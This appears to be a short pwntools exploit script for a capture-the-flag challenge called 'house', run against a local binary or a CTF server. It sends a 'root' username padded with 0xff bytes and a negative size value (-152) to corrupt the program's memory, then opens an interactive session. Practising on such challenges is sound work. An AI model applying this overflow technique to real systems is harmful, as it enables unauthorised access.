#!/usr/bin/python3

from pwn import *

exe = ELF('house_patched', checksec=False)

context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                b*create_user+244

                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('house.nc.jctf.pro', 1337)
else:
    p = process(exe.path)

GDB()
sla(b">> ", b"1")
sla(b": ", b"1")
sla(b": ", b"root\0".ljust(0x18, b"\xff") + b"\xff" * (0x18))
sla(b": \n", b"-152")


p.interactive()
